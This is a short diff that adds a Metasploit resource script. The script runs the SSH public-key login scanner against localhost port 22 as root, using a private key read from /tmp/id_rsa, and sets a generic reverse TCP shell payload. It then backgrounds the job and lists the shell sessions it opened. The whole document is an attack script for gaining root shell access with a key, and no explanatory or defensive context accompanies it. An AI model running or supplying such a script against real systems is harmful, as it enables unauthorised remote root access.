@@ -1,0 +1,10 @@
+use auxiliary/scanner/ssh/ssh_login_pubkey
+set PAYLOAD generic/shell_reverse_tcp
+set RHOSTS 127.0.0.1
+set RPORT 22
+set KEY_PATH /tmp/id_rsa
+set USERNAME root
+run
+background
+
+sessions -l
